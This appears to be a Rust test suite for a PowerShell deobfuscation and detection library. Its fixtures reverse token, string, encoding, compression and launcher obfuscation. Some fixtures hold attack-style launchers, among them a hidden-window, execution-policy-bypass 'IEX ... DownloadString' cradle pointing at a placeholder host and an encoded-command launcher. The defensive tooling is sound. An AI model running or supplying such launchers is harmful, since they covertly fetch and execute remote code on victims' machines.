#![allow(
    clippy::expect_used,
    clippy::unwrap_used,
    clippy::panic,
    clippy::missing_panics_doc
)]

use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64_STD;
use disrobe_pass_shell::{
    Detection, Dialect, Family, ReverseReport, detect, reverse_compress, reverse_encoding,
    reverse_launcher, reverse_string, reverse_token,
};
use flate2::Compression;
use flate2::write::GzEncoder;
use std::io::Write;

#[test]
fn fixture_token_level_reversal() {
    let src: &str = "I`E`X ([char]73 + [char]69 + [char]88)";
    let r: ReverseReport = reverse_token(src);
    assert!(r.output.contains("IEX"));
    assert!(r.output.contains("\"IEX\""));
}

#[test]
fn fixture_string_level_format() {
    let src: &str = "('{0}{1}{2}' -f 'Get','-','Process')";
    let r: ReverseReport = reverse_string(src);
    assert_eq!(r.output, "\"Get-Process\"");
}

#[test]
fn fixture_encoded_command_reverses() -> disrobe_pass_shell::Result<()> {
    let payload: &str = "Get-WmiObject Win32_Process";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u: u16| u.to_le_bytes())
        .collect();
    let b64: String = BASE64_STD.encode(&utf16);
    let launcher: String =
        format!("powershell -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand {b64}");
    let det: Detection = detect(launcher.as_bytes());
    assert_eq!(det.dialect, Dialect::PowerShell);
    assert_eq!(det.family, Family::InvokeObfuscationEncoding);
    let r: ReverseReport = reverse_encoding(&launcher)?;
    assert_eq!(r.output, payload);
    Ok(())
}

#[test]
fn fixture_compress_level_gzip_base64() -> disrobe_pass_shell::Result<()> {
    let payload: &str = "Write-Host 'compressed payload'";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u: u16| u.to_le_bytes())
        .collect();
    let mut gz: GzEncoder<Vec<u8>> = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&utf16)
        .expect("gzip write must succeed in test fixture");
    let compressed: Vec<u8> = gz.finish().expect("gzip finish must succeed");
    let b64: String = BASE64_STD.encode(&compressed);
    let snippet: String = format!(
        "[IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String('{b64}')), [IO.Compression.CompressionMode]::Decompress)"
    );
    let r: ReverseReport = reverse_compress(&snippet)?;
    assert!(r.output.contains("compressed payload"));
    Ok(())
}

#[test]
fn fixture_launcher_canonical() {
    let src: &str = "powershell -w hidden -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://x')";
    let r: ReverseReport = reverse_launcher(src);
    assert!(r.output.contains("-WindowStyle Hidden"));
    assert!(r.output.contains("-NoProfile"));
    assert!(r.output.contains("-ExecutionPolicy Bypass"));
}
